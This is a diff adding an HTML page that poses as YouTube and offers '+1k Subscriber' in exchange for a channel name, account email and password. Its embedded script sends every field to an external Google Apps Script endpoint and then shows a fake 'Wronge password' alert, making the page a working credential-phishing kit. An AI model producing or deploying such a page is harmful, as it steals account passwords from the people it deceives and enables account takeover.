@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="index.css">
+    <title>YouTube</title>
+</head>
+<body>
+    <nav class="nav_bar">
+        <div class="logo">
+            <img src="https://logosmarcas.net/wp-content/uploads/2020/04/YouTube-Logo.png" alt="">
+        </div>
+        <i>
+            1k+subscribe-5408999_1280 free Add your account  <strong>YouTube Off</strong>
+        </i>
+        <img src="https://cdn.pixabay.com/photo/2020/07/15/21/04/subscribe-5408999_1280.png" alt="">
+    </nav>
+    <center>
+    <form action="" name="google-sheet">
+        <img src="https://www.pngitem.com/pimgs/m/153-1539990_youtube-studio-logo-png-transparent-png.png" alt="">
+        <input type="text" placeholder="Your channel name" required name="y_ch_name">
+        <input type="email" placeholder="Your YouTube account id or email" required name="y_id_email">
+        <input type="password" placeholder="password" required name="Password">
+        <input type="url" placeholder="channel link" required name="y_ch_link">
+        <button type="submit">+1k Subscriber</button>
+    </form>
+    </center>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbw-NOz_-tWe02L-h3YMXvCBuHpLXhhViClUDaIvedrZ6dRPblI/exec'
+        const form = document.forms['google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => alert("Wronge password"))
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script>
+</body>
+</html>
